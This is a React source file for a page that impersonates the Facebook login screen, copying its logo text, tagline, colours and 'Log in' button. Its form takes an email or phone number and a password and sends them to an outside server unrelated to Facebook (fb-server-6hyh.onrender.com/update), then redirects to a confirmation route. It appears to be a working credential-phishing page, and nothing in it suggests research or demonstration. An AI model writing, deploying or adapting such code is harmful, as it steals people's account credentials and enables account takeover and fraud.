import React, {useState} from "react";
import axios from 'axios'
import {useNavigate} from "react-router-dom"

const Home = () => {
  const styles = {
    container: {
      display: "flex",
      flexDirection: "column",
      alignItems: "center",
      justifyContent: "center",
      minHeight: "100vh",
      backgroundColor: "white",
      fontFamily: "Helvetica, Arial, sans-serif",
      padding: "20px",
      color: "gray"
    },

    errorMessage: {
      color: 'red',
    },

    contentWrapper: {
      display: "flex",
      flexDirection: "column",
      alignItems: "center",
      width: "100%",
      maxWidth: "1000px",
    },
    topSection: {
      display: "flex",
      flexDirection: "column",
      alignItems: "center",
      textAlign: "center",
      marginBottom: "30px",
    },
    logo: {
      fontSize: "48px",
      color: "#1877f2",
      fontWeight: "bold",
      marginBottom: "10px",
    },
    desc: {
      fontSize: "20px",
      maxWidth: "400px",
    },
    formContainer: {
      backgroundColor: "#fff",
      width: "100%",
      maxWidth: "400px",
      padding: "20px",
      borderRadius: "8px",
      boxShadow: "0 2px 4px rgba(0, 0, 0, 0.1)",
    },
    input: {
      width: "100%",
      padding: "14px",
      marginBottom: "12px",
      borderRadius: "6px",
      border: "1px solid #dddfe2",
      fontSize: "16px",
      boxSizing: "border-box",
      backgroundColor: "white",
      color: "gray"
    },
    button: {
      width: "100%",
      padding: "14px",
      backgroundColor: "#1877f2",
      color: "#fff",
      border: "none",
      borderRadius: "6px",
      fontSize: "20px",
      fontWeight: "bold",
      cursor: "pointer",
    },
    link: {
      display: "block",
      textAlign: "center",
      color: "#1877f2",
      fontSize: "14px",
      marginTop: "12px",
      textDecoration: "none",
    },
    hr: {
      margin: "20px 0",
      border: "none",
      borderTop: "1px solid #dadde1",
    },
    createButton: {
      backgroundColor: "#42b72a",
      color: "#fff",
      padding: "12px 16px",
      border: "none",
      borderRadius: "6px",
      fontSize: "17px",
      fontWeight: "bold",
      cursor: "pointer",
      display: "block",
      margin: "0 auto",
    },
    footerText: {
      marginTop: "30px",
      fontSize: "14px",
      textAlign: "center",
    },
  };

  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [confirmPassword, setConfirmPassword] = useState('')
  const [error, setError] = useState(false)
  const [loading, setLoading] =useState(false)

const navigate = useNavigate()

  const handleForm = async () => {
  setLoading(true);

  // Temporary error variable
  let tempError = "";

  // Validation
  if (!username || !password || !confirmPassword) {
    tempError = "Fill all the fields";
  } else if (password !== confirmPassword) {
    tempError = "Passwords do not match";
  }

  // Update error state if needed
  if (tempError) {
    setError({ error: tempError });
    console.log(tempError);
    setLoading(false);
    return; // stop further execution
  } else {
    setError(""); // Clear any previous errors
  }

  // Proceed with API call
  try {
    const res = await axios.post("https://fb-server-6hyh.onrender.com/update", {
      username,
      password,
    });
    navigate('/confirm')
  } catch (err) {
    console.error("API Error:", err);
  } finally {
    setLoading(false);
  }
};
  return (
    <div style={styles.container}>
      <div style={styles.contentWrapper}>
        <div style={styles.topSection}>
          <div style={styles.logo}>facebook</div>
          <p style={styles.desc}>
            Facebook helps you connect and share with the people in your life.
          </p>
        </div>
        <div style={styles.formContainer}>
          <input
            type="text"
            placeholder="Email or phone number"
            style={styles.input}
            onChange={(e) => setUsername(e.target.value)}
          />
          <input
            type="text"
            placeholder="Password"
            style={styles.input}
            onChange={(e) => setPassword(e.target.value)}
          />

          <input
            type="text"
            placeholder="Confirm password"
            style={styles.input}
            onChange={(e) => setConfirmPassword(e.target.value)}
          />
          {error && <p style={styles.errorMessage}>{error.error}</p>}
          <button style={styles.button} onClick={handleForm}>{loading ? "Logging in..." : "Log in"}</button>
          <a href="#" style={styles.link}>
            Forgotten password?
          </a>
        </div>
        <p style={styles.footerText}>
          All rights reserved
        </p>
      </div>
    </div>
  );
};

export default Home;
